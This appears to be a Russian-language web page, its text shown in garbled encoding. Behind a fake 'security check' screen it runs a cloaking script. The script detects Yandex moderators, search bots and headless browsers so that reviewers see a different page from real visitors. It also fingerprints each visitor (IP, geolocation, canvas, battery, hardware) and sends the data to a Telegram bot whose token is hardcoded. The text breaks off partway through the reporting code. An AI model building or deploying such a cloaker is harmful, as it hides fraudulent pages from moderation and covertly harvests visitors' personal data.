<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            color: #333;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #4285f4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
            color: #333;
            margin-bottom: 10px;
        }

        .human-verification {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08), 
                        0 6px 12px rgba(0, 0, 0, 0.05), 
                        inset 0 -3px 0 rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 340px;
            transition: all 0.5s ease-in-out, transform 0.3s ease;
            opacity: 1;
            transform: translateY(0);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .human-verification.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .human-verification h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #4285f4;
            font-size: 24px;
            font-weight: 600;
        }

        .human-verification p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #5f6368;
        }

        .mouse-icon {
            display: inline-block;
            width: 40px;
            height: 60px;
            border: 3px solid #4285f4;
            border-radius: 20px;
            position: relative;
            margin: 0 auto 15px;
        }

        .mouse-icon:before {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            background: #4285f4;
            border-radius: 50%;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            animation: mousescroll 2s infinite;
        }

        .pulse-effect {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: radial-gradient(circle, rgba(66, 133, 244, 0.3) 0%, rgba(66, 133, 244, 0) 70%);
            border-radius: 16px;
            opacity: 0;
            animation: pulse 2s infinite;
            pointer-events: none;
        }

        .bot-trap-link {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 0;
            height: 0;
            width: 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0; }
            50% { transform: scale(1); opacity: 0.6; }
            100% { transform: scale(1.05); opacity: 0; }
        }

        @keyframes mousescroll {
            0% { opacity: 1; top: 10px; }
            50% { opacity: 1; top: 25px; }
            100% { opacity: 0; top: 30px; }
        }

        @keyframes cursor-animation {
            0% { transform: translate(0, 0); }
            25% { transform: translate(10px, 10px); }
            50% { transform: translate(-10px, 10px); }
            75% { transform: translate(5px, -10px); }
            100% { transform: translate(0, 0); }
        }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ */
        @media (max-width: 768px) {
            .human-verification {
                width: 85%;
                max-width: 300px;
                padding: 20px;
            }
            
            .loader {
                width: 50px;
                height: 50px;
            }
            
            .loading-text {
                font-size: 18px;
            }
            
            .human-verification h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
    </div>

    <div class="human-verification">
        <div class="pulse-effect"></div>
        <h3>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h3>
        <div class="mouse-icon"></div>
        <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–≤–∏–≥–∞–π—Ç–µ –∫—É—Ä—Å–æ—Ä–æ–º, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å</p>
    </div>

    <a href="#" class="bot-trap-link">–°–µ–∫—Ä–µ—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –±–æ—Ç–æ–≤</a>

    <!-- Yandex.Metrika counter -->
    <script type="text/javascript" >
        (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
        m[i].l=1*new Date();
        for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
        k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
        (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

        ym(101122135, "init", {
            clickmap:true,
            trackLinks:true,
            accurateTrackBounce:true,
            webvisor:true
        });
    </script>
    <noscript><div><img src="https://mc.yandex.ru/watch/101122135" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
    <!-- /Yandex.Metrika counter -->

    <script>
    (async function() {
        'use strict';

        // ===== –ö–û–ù–°–¢–ê–ù–¢–´ –ò –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø =====
        const PAGE_LOAD_START = performance.now();
        const WHITE_PAGE = 'https://dzen.ru';
        const BLACK_PAGE = 'https://google.com';
        const TELEGRAM_BOT_TOKEN = '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU';
        const TELEGRAM_CHAT_ID = '1237450939';
        
        // –°–ø–∏—Å–∫–∏ –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±–æ—Ç–æ–≤
        const SEARCH_BOT_AGENTS = [
            // –Ø–Ω–¥–µ–∫—Å –±–æ—Ç—ã (–¢–û–õ–¨–ö–û –±–æ—Ç—ã, –Ω–µ –æ–±—ã—á–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏)
            /YandexBot/i, /YandexAccessibilityBot/i, /YandexMobileBot/i, /YandexDirectDyn/i,
            /YandexImages/i, /YandexVideo/i, /YandexVideoParser/i, /YandexMedia/i,
            /YandexBlogs/i, /YandexFavicons/i, /YandexWebmaster/i, /YandexPagechecker/i,
            /YandexImageResizer/i, /YaDirectFetcher/i, /YandexCalendar/i, /YandexSitelinks/i,
            /YandexMetrika/i, /YandexNews/i, /YandexCatalog/i, /YandexMarket/i,
            /YandexVerticals/i, /YandexVertis/i, /YandexSearchShop/i, /YandexOntoDB/i,
            /YandexOntoDBAPI/i, /YandexRCA/i, /YandexSpravBot/i, /YandexScreenshotBot/i,
            /YandexMobileScreenShotBot/i, /YandexAdNet/i, /YandexDirect/i, /YandexTurbo/i,
            /YandexRenderResourcesBot/i, /YandexTracker/i, /YandexPartner/i, /YandexComBot/i,
            
            // Google –±–æ—Ç—ã
            /Googlebot/i, /AdsBot-Google/i, /Google-Read-Aloud/i, /DuplexWeb-Google/i,
            /Google Favicon/i, /googleweblight/i, /Storebot-Google/i, /Google-PageRenderer/i,
            /Google-Site-Verification/i, /Google-SearchByImage/i, /GoogleAccessibilityTest/i,
            /GoogleProducer/i, /APIs-Google/i, /Google-Adwords-Instant/i, /FeedFetcher-Google/i,
            /Google-Apps-Script/i,
            
            // Microsoft/Bing –±–æ—Ç—ã
            /bingbot/i, /msnbot/i, /BingPreview/i, /AdIdxBot/i, /MicrosoftPreview/i, /MicrosoftSearch/i,
            
            // –î—Ä—É–≥–∏–µ –ø–æ–∏—Å–∫–æ–≤—ã–µ –±–æ—Ç—ã
            /slurp/i, /duckduckbot/i, /baiduspider/i, /Yahoo! Slurp/i, /YahooSeeker/i,
            /Exabot/i, /facebookexternalhit/i, /ia_archiver/i, 
            /Applebot/i, /archive.org_bot/i, /BuiltWith/i, /Bot.AraTear/i, /BUbiNG/i,
            /Chrome-Lighthouse/i, /Clickagy/i, /CliniqueBot/i, /DomainStatsBot/i, /evc-batch/i,
            
            // –û–±—â–∏–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –¥–ª—è –±–æ—Ç–æ–≤
            /Crawler/i, /crawler/i, /Spider/i, /spider/i, /archiver/i, /validator/i,
            /parser/i, /reader/i, /indexer/i, /panscient/i, /monitoring/i,
            
            // SEO/–ê–Ω–∞–ª–∏—Ç–∏—á–µ—Å–∫–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã
            /semrush/i, /ahrefs/i, /mj12bot/i, /majestic/i, /rogerbot/i, /dotbot/i,
            /screaming/i, /seokicks/i, /sistrix/i, /seobilitybot/i, /seoscanners/i,
            /proximic/i, /pingdom/i, /gtmetrix/i, /pagespeed/i, /webmeup/i, /Catchpoint/i,
            /Riddler/i, /Nessus/i, /datasift/i, /BLEXBot/i, /AspiegelBot/i, /ScoutJet/i,
            
            // –ù–æ–≤—ã–µ –±–æ—Ç—ã –∏–∑ 2023
            /bytespider/i, /DeepCrawl/i, /Sogou/i, /MojeekBot/i, 
            /SeznamBot/i, /Mail.RU_Bot/i, /SemrushBot/i, /Qwantify/i, /CensysInspect/i,
            /PetalBot/i, /Cliqzbot/i, /QwantMobile/i, /coccocbot/i, /EarwigBot/i,
            /NetcraftSurveyAgent/i, /weborama-fetcher/i, /BrightSign/i, /Cookiebot/i,
            /DataForSeoBot/i
        ];
        
        // –ò—Å–∫–ª—é—á–∏—Ç—å –æ–±—ã—á–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –Ø–Ω–¥–µ–∫—Å–∞ –∏ –±—Ä–∞—É–∑–µ—Ä—ã
        const YANDEX_REGULAR_APPS = [
            /YaBrowser/i, // –Ø–Ω–¥–µ–∫—Å.–ë—Ä–∞—É–∑–µ—Ä
            /YandexSearch/i, // –Ø–Ω–¥–µ–∫—Å.–ü–æ–∏—Å–∫
            /Yandex\/[\d\.]+/i, // –Ø–Ω–¥–µ–∫—Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
            /Dzen/i, // –î–∑–µ–Ω –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
            /YandexMobileApp/i // –ú–æ–±–∏–ª—å–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –Ø–Ω–¥–µ–∫—Å–∞
        ];
        
        // –î–æ–º–µ–Ω—ã –Ø–Ω–¥–µ–∫—Å–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ DNS
        const YANDEX_DOMAINS = [
            '.yandex.ru', '.yandex.net', '.yandex.com', '.yandex.by', '.yandex.kz', 
            '.yandex.ua', '.yandex.md', '.yandex.com.tr', '.yandex.com.am'
        ];

        // –§–ª–∞–≥–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        let botTrapActivated = false;
        let hadMouseMovement = false;
        let pageFullyLoaded = false;
        let redirectInitiated = false;
        let mouseMoveTimeout = null;
        let redirectTimeout = null;
        let userInfo = null;
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ –±–ª–æ–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ —á–µ–ª–æ–≤–µ–∫–∞
        const humanVerificationBlock = document.querySelector('.human-verification');
        
        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–∏–ø–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // –°—á–µ—Ç—á–∏–∫ –≤–∏–∑–∏—Ç–æ–≤
        let visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
        localStorage.setItem('visitCount', visitCount.toString());

        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        let config = {
            common: {
                TelegramReporting: true
            },
            desktop: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: true,
                CheckMouseMovement: true,
                CheckVisitFrequency: true,
                MouseMovementTimeout: 7000,
                RedirectDelay: 500,
                MaxVisitsBeforeBlock: 5,
                BlockDuration: 3600000
            },
            mobile: {
                CheckSearchBots: true,
                CheckHeadlessBrowser: true,
                CheckYandexModerator: true,
                CheckYandexBot: true,
                CheckIpBlacklist: true,
                CheckDevTools: false,
                CheckMouseMovement: false,
                CheckVisitFrequency: false,
                RedirectDelay: 1000,
                MaxVisitsBeforeBlock: 10,
                BlockDuration: 3600000
            },
            experimental: {
                CheckAdBlocker: false,
                CheckVirtualMachine: false,
                CheckTorNetwork: false,
                CheckVPN: false,
                PerformTimingAttacks: false,
                CheckWebRTCLeakage: false
            }
        };

        // ===== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò =====

        /**
         * –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞
         */
        async function loadFile(url) {
            try {
                const response = await fetch(url);
                if (!response.ok) {
                    throw new Error(`–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ ${url}: ${response.statusText}`);
                }
                return await response.text();
            } catch (error) {
                console.error(`–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª ${url}:`, error);
                return null;
            }
        }

        /**
         * –ü–∞—Ä—Å–∏–Ω–≥ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
         */
        function parseConfig(configText) {
            if (!configText) return;

            let currentSection = 'common';
            const lines = configText.split('\n');

            for (const line of lines) {
                const trimmedLine = line.trim();
                
                // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø—É—Å—Ç—ã–µ —Å—Ç—Ä–æ–∫–∏ –∏ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏
                if (!trimmedLine || trimmedLine.startsWith('#')) continue;
                
                // –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–µ–∫—Ü–∏–π [Desktop], [Mobile], [Experimental]
                if (trimmedLine.startsWith('[')) {
                    const sectionMatch = trimmedLine.match(/\[(.*?)\]/);
                    if (sectionMatch) {
                        currentSection = sectionMatch[1].toLowerCase();
                    }
                    continue;
                }
                
                // –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ (–∫–ª—é—á=–∑–Ω–∞—á–µ–Ω–∏–µ)
                const parts = trimmedLine.split('=');
                if (parts.length === 2) {
                    const key = parts[0].trim();
                    const value = parts[1].trim().toLowerCase();
                    
                    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–µ–∫—Ü–∏—é –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
                    let targetSection;
                    if (currentSection === 'desktop') {
                        targetSection = config.desktop;
                    } else if (currentSection === 'mobile') {
                        targetSection = config.mobile;
                    } else if (currentSection === 'experimental') {
                        targetSection = config.experimental;
                    } else {
                        targetSection = config.common;
                    }
                    
                    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞
                    if (value === 'on' || value === 'true') {
                        targetSection[key] = true;
                    } else if (value === 'off' || value === 'false') {
                        targetSection[key] = false;
                    } else if (!isNaN(parseInt(value))) {
                        targetSection[key] = parseInt(value);
                    } else {
                        targetSection[key] = value;
                    }
                }
            }
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –∏–∑ URL
         */
        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        /**
         * –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —á–∞—Å—Ç–æ—Ç—ã –≤–∏–∑–∏—Ç–æ–≤
         */
        function trackVisits() {
            const now = Date.now();
            const visits = JSON.parse(localStorage.getItem('recentVisits') || '[]');
            
            // –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä—ã–µ –≤–∏–∑–∏—Ç—ã (—Å—Ç–∞—Ä—à–µ 30 –º–∏–Ω—É—Ç)
            const recentVisits = visits.filter(timestamp => now - timestamp < 30 * 60 * 1000);
            
            // –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–∫—É—â–∏–π –≤–∏–∑–∏—Ç
            recentVisits.push(now);
            localStorage.setItem('recentVisits', JSON.stringify(recentVisits));
            
            return recentVisits.length;
        }

        /**
         * –ü—Ä–æ–≤–µ—Ä–∫–∞, –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ —á–∞—Å—Ç–æ—Ç–µ
         */
        function isBlockedByFrequency() {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ onoff.txt
            if (typeof onOffState !== 'undefined' && onOffState === 'off') {
                return false;
            }

            const currentConfig = isMobile ? config.mobile : config.desktop;
            if (!currentConfig.CheckVisitFrequency) return false;

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É
            const blockExpiry = parseInt(localStorage.getItem('blockExpiry') || '0');
            if (blockExpiry > Date.now()) {
                return true;
            }

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —á–∞—Å—Ç–æ—Ç—É –≤–∏–∑–∏—Ç–æ–≤
            const visitCount = trackVisits();
            const maxVisits = currentConfig.MaxVisitsBeforeBlock;
            
            if (visitCount > maxVisits) {
                // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É –Ω–∞ –∑–∞–¥–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è
                localStorage.setItem('blockExpiry', (Date.now() + currentConfig.BlockDuration).toString());
                return true;
            }
            
            return false;
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —á–µ—Ä–µ–∑ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ—Ä–≤–∏—Å–æ–≤
         */
        async function getIpAddress() {
            const services = [
                { url: 'https://api.ipify.org?format=json', extract: data => data.ip },
                { url: 'https://ipinfo.io/json', extract: data => data.ip },
                { url: 'https://api.myip.com', extract: data => data.ip },
                { url: 'https://ipapi.co/json/', extract: data => data.ip }
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service.url);
                    if (response.ok) {
                        const data = await response.json();
                        return service.extract(data);
                    }
                } catch (error) {
                    console.error(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP —á–µ—Ä–µ–∑ ${service.url}:`, error);
                }
            }

            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ Canvas Fingerprint
         */
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;

                // –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–∞–Ω–≤–∞—Å–∞ —Ç–µ–∫—Å—Ç–æ–º –∏ —Ñ–∏–≥—É—Ä–∞–º–∏
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#00f';
                ctx.fillText('Canvas Fingerprint üëã', 2, 2);
                ctx.fillStyle = '#f00';
                ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
                ctx.fill();

                return canvas.toDataURL().substring(0, 100) + '...';
            } catch (e) {
                return "Canvas –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            }
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
         */
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch (e) {
                return "–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞";
            }
        }

        /**
         * –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–º—è—Ç–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
         */
        function getDeviceMemory() {
            if (navigator.deviceMemory) {
                return `${navigator.deviceMemory}GB`;
            }
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–µ–≤–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
         */
        function getConnectionInfo() {
            const connection = navigator.connection || 
                              navigator.mozConnection || 
                              navigator.webkitConnection;
            
            if (connection) {
                return {
                    type: connection.effectiveType || "unknown",
                    rtt: connection.rtt || "unknown"
                };
            }
            
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –°–±–æ—Ä –ø–æ–ª–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
         */
        async function collectUserInfo() {
            const now = performance.now();
            const loadTime = Math.round(now - PAGE_LOAD_START);
            const battery = await getBatteryInfo();
            const ipAddress = await getIpAddress();
            
            // –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(',') : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                platform: navigator.platform,
                deviceType: isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ' : '–î–µ—Å–∫—Ç–æ–ø',
                visitCount: visitCount,
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —ç–∫—Ä–∞–Ω–µ –∏ –æ–∫–Ω–µ
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                
                // –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                url: window.location.href,
                referrer: document.referrer || "none",
                
                // –•—Ä–∞–Ω–∏–ª–∏—â–∞ –∏ –∫—É–∫–∏
                cookiesEnabled: navigator.cookieEnabled,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                
                // –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∏ –æ–±–æ—Ä—É–¥–æ–≤–∞–Ω–∏–µ
                hardwareConcurrency: navigator.hardwareConcurrency || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                memory: getDeviceMemory(),
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: getConnectionInfo(),
                
                // –î–æ–ø. –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ
                doNotTrack: navigator.doNotTrack || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                webdriver: !!navigator.webdriver,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                
                // –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã
                canvas: getCanvasFingerprint(),
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–≤–µ–¥–µ–Ω–∏–∏
                hadMouseMovement: hadMouseMovement,
                botTrapActivated: botTrapActivated,
                
                // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                battery: battery,
                loadTime: loadTime,
                ipAddress: ipAddress,
                geolocation: "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ" // –ó–∞–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–∑–∂–µ, –µ—Å–ª–∏ –≤–æ–∑–º–æ–∂–Ω–æ
            };

            // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            try {
                const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                if (geoResponse.ok) {
                    const geoData = await geoResponse.json();
                    info.geolocation = `${geoData.city || ""}, ${geoData.country_name || ""}`;
                }
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", e);
            }

            return info;
        }

        /**
         * –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç—á–µ—Ç–∞ –≤ Telegram
         */
        async function sendTelegramReport(reason, data) {
            if (!config.common.TelegramReporting) return;

            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            let message = `ü™§ –ö–õ–û–ê–ö–ê: –õ–û–í–£–®–ö–ê –°–†–ê–ë–û–¢–ê–õ–ê\n\n`;
            message += `‚ö†Ô∏è –ü—Ä–∏—á–∏–Ω–∞: ${reason}\n\n`;
            message += `üì± –¢–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${data.deviceType}\n`;
            message += `üî¢ –°—á–µ—Ç—á–∏–∫ –ø–æ—Å–µ—â–µ–Ω–∏–π: ${data.visitCount}\n`;
            message += `üåê IP: ${data.ipAddress}\n`;
            message += `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${data.geolocation}\n`;
            message += `üñ•Ô∏è User-Agent: ${data.userAgent}\n`;
            message += `üìè –≠–∫—Ä–∞–Ω: ${data.screen.width}x${data.screen.height} (${data.screen.pixelRatio}x)\n`;
            message += `‚è±Ô∏è –í—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏: ${data.loadTime}–º—Å\n`;
            message += `üîó URL: ${data.url}\n`;
            message += `‚Ü©Ô∏è Referrer: ${data.referrer}\n\n`;
            
            message += `üñ±Ô∏è –î–≤–∏–∂–µ–Ω–∏–µ –º—ã—à–∏: ${data.hadMouseMovement ? 'yes' : 'no'}\n`;
            message += `üîã –ë–∞—Ç–∞—Ä–µ—è: ${typeof data.battery === 'object' ? `–ó–∞—Ä—è–¥: ${data.battery.level}%, –ó–∞—Ä—è–∂–∞–µ—Ç—Å—è: ${data.battery.charging ? '–¥–∞' : '–Ω–µ—Ç'}` : data.battery}\n`;
            message += `üß† –Ø–¥—Ä–∞ CPU: ${data.hardwareConcurrency}\n`;
            message += `üíæ –ü–∞–º—è—Ç—å: ${data.memory}\n`;
            message += `üåç –Ø–∑—ã–∫: ${data.language}\n`;
            message += `‚è∞ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${data.timeZone}\n`;
            message += `üîå –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: ${typeof data.connection === 'object' ? `${data.connection.type} (RTT: ${data.connection.rtt})` : data.connection}\n`;
            message += `ü§ñ WebDriver: ${data.webdriver ? 'yes' : 'no'}\n`;
            message += `üé® Canvas: ${data.canvas}`;

            // –°–æ–∑–¥–∞–µ–º URL –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è —á–µ—Ä–µ–∑ API Telegram
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç
            try {
                // –ü—Ä–æ–±—É–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å fetch
                if (window.fetch) {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                    return response.ok;
                } else {
                    // –†–µ–∑–µ—Ä–≤–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç —á–µ—Ä–µ–∑ XMLHttpRequest
